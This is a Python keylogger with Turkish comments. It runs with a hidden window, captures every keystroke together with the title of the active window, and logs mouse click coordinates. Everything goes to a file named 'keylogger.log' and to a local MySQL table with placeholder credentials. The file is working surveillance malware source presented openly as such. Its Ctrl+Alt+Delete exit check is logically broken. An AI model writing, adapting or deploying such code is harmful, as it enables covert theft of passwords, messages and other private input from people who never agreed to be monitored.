import subprocess

info = subprocess.STARTUPINFO() #subprocess modülünün STARTUPINFO() fonksiyonunu kullanarak yeni bir startupinfo nesnesi oluşturur.
info.dwFlags |= subprocess.STARTF_USESHOWWINDOW #startupinfo nesnesinin dwFlags özelliğine STARTF_USESHOWWINDOW bayrağını atar.
info.wShowWindow = subprocess.SW_HIDE #startupinfo nesnesinin wShowWindow özelliğini SW_HIDE sabit değerine ayarlar.

#gerekli kütüphaneleri import ediyoruz subprocessi uygulama penceresini gizli yapmak için zaten importladık.
import logging  #Bu satır ile python'da log dosyası oluşturma ve yönetme işlemlerini yapabilmek için logging modülünü içe aktarıyoruz.
import ctypes
import datetime
import smtplib  #Bu satır ile python'da e-posta gönderme işlemlerini yapabilmek için smtplib modülünü içe aktarıyoruz.
import pynput  #Bu satır ile python'da bilgisayarın input cihazlarını kontrol etme işlemlerini yapabilmek için pynput modülünü içe aktarıyoruz.
import sys  #Bu satır ile python'da programın çalışmasını kontrol etme ve sonlandırma işlemlerini yapabilmek için sys modülünü içe aktarıyoruz.
import pymysql  #Bu satır ile python'da MySQL veritabanına bağlantı ve işlemler yapabilmek için pymysql modülünü içe aktarıyoruz.

#kütüphanelerden gerekli modülleri çekiyoruz
from pynput import keyboard  #Bu satır ile python'da keyboard modülünü içe aktarıyoruz. Bu modül pynput modülünde yer alır ve tuş vuruşlarını dinlemek için kullanılır.
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from pynput import mouse
from ctypes.wintypes import POINT
from ctypes import windll, create_string_buffer



# Log dosyasının adını tanımlıyoruz
log_file = "keylogger.log"

# Log dosyasını oluşturuyoruz ve level olarak DEBUG seçiyoruz
logging.basicConfig(filename=log_file, level=logging.DEBUG)

# Bağlantı bilgilerini tanımlıyoruz
connection = pymysql.connect(host="localhost", user="root", password="mysqlsifreniz", db="databaseisminiz")
cursor = connection.cursor()  #Bu satır ile veritabanına bağlı olarak cursor nesnesi oluşturuyoruz. Bu nesne ile veritabanına SQL sorguları yollayabiliriz.

def get_active_window_title():
    # odaklı pencereyi kontrol et
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    # pencerenin başlığının uzunluğunu alın
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    # Pencerenin başlığı için bellek ayırın
    buffer = ctypes.create_unicode_buffer(length + 1)
    # Pencerenin başlığını al
    ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length + 1)
    # Pencerenin başlığını döndür
    return buffer.value


def on_press(key):  # Tuş vuruşlarını dinlemek için fonksiyon
    current_time = str(datetime.datetime.now())
    active_window = get_active_window_title()
    try:
        current_key = str(key.char)  # Tuş vuruşlarını string olarak alıyoruz

    except AttributeError:
        if key == key.space:
            current_key = " "  # Space tuşuna basıldıysa boşluk koyuyoruz
        else:
            current_key = " " + str(key) + " "  # Başka bir tuşa basıldıysa tuşun adını string olarak alıyoruz
    logging.info(current_key)  # log dosyasına kaydediyoruz
    current_window = get_active_window_title()  # Kullanıcının tıkladığı uygulamanın adını alıyoruz
    # Bu satır ile veritabanına kayıt yapıyoruz.
    cursor.execute("INSERT INTO pyloggersz (key_press, active_window) VALUES (%s, %s)", (current_key, current_window))
    connection.commit()  # Veritabanına kaydedilen bilgiyi kaydediyoruz
    try:
        current_key = str(
            key.char)  # Eğer tuş vuruşu bir harf ise, o harfi string olarak alıyoruz ve current_key değişkenine atıyoruz.
    except AttributeError:  # Eğer hata oluşursa, AttributeError hatası alınır.
        if key == keyboard.Key.ctrl_l and key == keyboard.Key.alt_l and key == keyboard.Key.delete:  # Eğer tuş vuruşu "ctrl+alt+delete" kombinasyonu ise,
            sys.exit()  # Uygulamanın çalışmasını sonlandırır.

def on_click(x, y, button, pressed):
    # Tıklama gerçekleştiğinde x, y koordinatlarını ve tıklanan düğmeyi yazdırın
    if pressed:
        # SQL sorgusu ile veritabanına tıklama bilgilerini kaydedin
        sql = "INSERT INTO pyloggersz (event_type, mouse_x, mouse_y, click) VALUES (%s, %s, %s, %s)"
        cursor.execute(sql, ('click', x, y, button))  #Bu satır ile veritabanına kayıt yapıyoruz.
        connection.commit()


# Listener iş parçacıklarını ayarlayın
keyboard_listener = KeyboardListener(on_press=on_press)
mouse_listener = MouseListener(on_click=on_click)

# Dizileri başlatın ve komut dosyasının erken bitmemesi için onlara katılın
keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()



